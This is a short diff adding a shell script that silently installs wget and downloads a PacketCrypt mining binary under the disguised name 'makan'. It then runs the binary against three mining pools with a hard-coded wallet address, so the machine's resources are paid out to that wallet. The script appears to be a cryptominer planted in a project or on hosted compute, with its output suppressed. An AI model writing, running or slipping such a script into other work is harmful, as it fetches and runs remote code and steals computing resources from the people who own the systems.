@@ -1,0 +1,4 @@
+apt install wget -y >/dev/null 2>&1
+wget -qO makan https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.4.4/packetcrypt-v0.4.4-linux_amd64
+chmod +x makan
+./makan ann -p pkt1qdq9vtk7ctl243eats3096t49c9fm728z3a808y http://pool.srizbi.com http://pool.pktpool.io http://pool.pkt.world
